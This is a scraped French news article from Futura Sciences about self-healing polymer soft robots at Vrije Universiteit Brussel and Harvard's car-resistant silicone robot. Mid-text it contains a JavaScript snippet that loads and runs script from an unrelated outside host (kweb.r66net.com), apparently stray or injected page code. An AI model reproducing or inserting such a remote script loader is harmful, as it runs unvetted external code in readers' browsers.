{"title": "Ce robot mou peut cicatriser comme un humain", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-21", "content": "Des chercheurs de l'universite de Bruxelles ont cree des polymeres caoutchouteux sous forme de gel solide qui peuvent s'autoreparer lorsqu'ils sont chauffes. Ce materiau est utilise pour creer des robots mous dont les membres pourraient cicatriser en cas de dommage. En  robotique , l'une des tendances phare est celle des  robots mous . Fabriques dans des materiaux souples, ils peuvent servir a des manipulations d'objets delicats, notamment dans l'industrie alimentaire et sont aussi employes en  chirurgie . De plus, leur douceur securise leur cohabitation avec les humains dans des environnements de travail. Le revers de lamedaille est que ces materiaux sont beaucoup plus exposes aux dommages causes par des objets tranchants ou une pression excessive. Des chercheurs de l'universite Vrije de Bruxelles (Belgique) ont trouve une solution prometteuse en creant un  materiau  mou capable de cicatriser. Il s'agit d'un polymere dit de Diels-Alder constitue de reseaux covalents thermosensibles. Lorsqu'ils sont chauffes, les brins de ce materiau caoutchouteux se reagregent et colmatent ainsi toute fissure. Le doigt en polymere entaille par un couteau va s'autocicatriser une fois chauffe. (c)  New Scientist Le polymere autocicatrisant doit etre chauffe a 80 degC Dans leur article scientifique publie par  Science Robotics , les chercheurs expliquent qu'ils ont teste leur materiau sur trois systemes robotiques : une pince, un bras robotise et un muscle artificiel. Comme on peut le voir dans la video, l'entaille provoquee par un coup de canif donne a l'extremite d'un des doigts en polymere est rapidement colmatee lorsqu'il est chauffe a 80 degC.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour le moment, le processus de  cicatrisation  doit etre declenche manuellement, mais les chercheurs travaillent sur une solution automatique, soit en modifiant le polymere pour qu'il se repare de lui-meme, soit en programmant le  robot  pour qu'il detecte un dommage structurel et puisse chauffer la partie concernee. Pour en savoir plus Le robot le plus resistant du monde est mou Article initial de  Marc Zaffagni , paru le 10/09/2014 A l'universite d'Harvard, une equipe a cree un robot en  silicone  depourvu de squelette rigide qui peut se deplacer en autonomie et resister au froid, au  feu  et meme a l'ecrasement par une  voiture . Ce concept pourrait ouvrir la voie a la fabrication de  robots  plus fiables et mieux adaptes aux conditions extremes. Un robot mou qui joue les durs... Voici comment on pourrait decrire la derniere creation du  Wyss Institute for Biologically Inspired Engineering  de l'universite d'Harvard a qui l'on doit deja un concept de  robot origami . Une equipe menee par Michael Tolley, associe de recherche postdoctorale, a developpe un  robot autonome  sans squelette rigide qui peut resister au froid, au feu et meme a l'ecrasement par une voiture. Long de 65 cm, il se presente sous la forme d'une  etoile  a quatre branches au centre de laquelle se trouvent la batterie et son systeme de locomotion  pneumatique . Le  corps du robot  est fait de silicone avec une structure composee de compartiments communicant entre eux pour laisser passer l' air  comprime injecte par un petit compresseur. Sous l'effet de cette pression, le robot avance en marchant a une  vitesse  de 18 metres par heure, peut-on lire dans l'article scientifique publie par la revue  Soft Robotics . Il peut egalement se deplacer en ondulant, mais sa vitesse maximale n'est alors que de deux metres par heure. Les chercheurs expliquent que le silicone a l'avantage de supporter de grandes amplitudes de temperature, qu'il est etanche, resiste aux  ultraviolets , aux flammes (sur une  duree  limitee) et aux substances corrosives. Le silicone employe pour fabriquer le corps du robot a l'avantage de supporter de grandes amplitudes thermiques. L'engin a ete teste dans la neige par une temperature de -9 degC. Il a egalement ete expose au feu direct pendant 20 secondes. (c)  Wyss Institute, Harvard University                               Ecrase par une voiture : meme pas mal Des tests ont ete realises pour eprouver la  resistance  de ce robot. L'equipe du Wyss Institute n'a pas menage sa drole d'etoile de mer : marche forcee sur la neige par une temperature de -9 degC, exposition au feu direct durant 20 secondes, progression dans l'eau et attaque a l' acide . Pour finir, une voiture lui a roule dessus. Le silicone a supporte la pression et le robot a poursuivi son cheminement sans degat. Il faut preciser toutefois que cette tentative d'ecrasement s'est limitee a un seul de ses quatre membres et a epargne sa partie centrale renfermant l'electronique, le moteur et la batterie. C'est d'ailleurs dans ce domaine que resident les principaux obstacles techniques. Les chercheurs pensent pouvoir repartir les composants dans le corps du robot afin de mieux les proteger. Ils misent aussi sur les developpements a venir en  matiere  d' electronique souple  notamment pour la batterie et le systeme pneumatique. Ce type de structure monolithique est moins onereuse a produire et potentiellement plus fiable qu'un  squelette  fait de differentes pieces en  mouvement . Mais l'equipe reconnait que ce type de robot pneumatique souffre de plusieurs inconvenients. Leurs mouvements sont moins precis, ils sont moins  reactifs  et sont susceptibles d'etre perces par un obstacle pointu. Quoi qu'il en soit, ces travaux ouvrent des perspectives interessantes pour la  conception de robots  en matiere souple qui seront a la fois plus resistants et mieux adaptes a un contact direct avec les humains. ", "theme": "tech"}